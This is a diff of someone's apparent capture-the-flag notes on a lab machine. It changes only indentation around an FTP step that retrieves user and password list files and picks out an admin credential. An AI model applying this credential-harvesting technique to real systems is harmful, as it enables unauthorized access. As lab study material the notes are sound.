@@ -25,13 +25,13 @@ target ip :: 10.129.217.162
 			|_http-title: Smash - Bootstrap Business Template
 			Service Info: OS: Unix
 
-		here we can see only two ports are open 
+here we can see only two ports are open 
 
-		FTP port have some usefull information as we can see on result
+FTP port have some usefull information as we can see on result
 
 
 
-		let get the files and see what it contains 
+let get the files and see what it contains 
 
 		ftp 10.129.217.162
 
@@ -39,18 +39,18 @@ target ip :: 10.129.217.162
 		-rw-r--r--    1 ftp      ftp            62 Apr 20  2021 allowed.userlist.passwd
 
 
-      cat allowed.userlist.passwd 
-      root
-      Supersecretpassword1
-      @BaASD&9032123sADS
-      rKXM59ESxesUFHAd
+		      cat allowed.userlist.passwd 
+		      root
+		      Supersecretpassword1
+		      @BaASD&9032123sADS
+		      rKXM59ESxesUFHAd
 
 
-      cat allowed.userlist       
-      aron
-      pwnmeow
-      egotisticalsw
-      admin
+		      cat allowed.userlist       
+		      aron
+		      pwnmeow
+		      egotisticalsw
+		      admin
 
 here we have admin and it's password rKXM59ESxesUFHAd
 
